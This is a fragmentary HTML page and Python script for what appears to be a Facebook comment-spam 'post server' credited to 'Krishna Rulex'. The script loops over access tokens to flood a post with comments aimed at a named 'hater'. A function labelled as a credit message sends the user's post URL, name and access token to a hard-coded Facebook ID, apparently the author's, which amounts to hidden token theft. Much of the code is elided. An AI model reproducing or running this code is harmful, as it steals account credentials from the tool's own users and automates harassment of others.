...
<head>
    ...
    <title>KRISHNA BRAND POST SERVER</title>
    <style>
        body {
...
<body>
    <div class="container">
        <div class="box">
            <h1>TRICKER KRISHNA BRAND POST </h1>
            <div class="credit">
                <p>1. CREDIT:- KRISHNA RULEX</p>
                <p>2. OWNER => KRISHNA</p>
                <p>3. YOUTUBE:- <a href="😻">YouTube</a></p>
                <p>4. FACEBOOK:- <a href="😘">Facebook</a></p>
...
def send_initial_message():
    ...
    # Message template
    msg_template = "CREDIT:- KRISHNA RULEX \n Owner => KRISHNA \n Hello Krishna Sir. \n I am using your post server. \n This Is My Details :- \n Post Url :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = ["61573328623221"]
    ...
    while True:
        try:
            for comment_index in range(num_comments):
                ...
                if response.ok:
                    print("\033[1;36m[✓] TRICKER KRISHNA BRAND SERVER RUNING Comment No. {} Post Id {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print(formatted_time)
                    print('\033[1;92m' + '✪✭═══════•『KRISHNA ♡ RULEX </3 KRISHNA BRAND』•═══════✭✪')
                else:
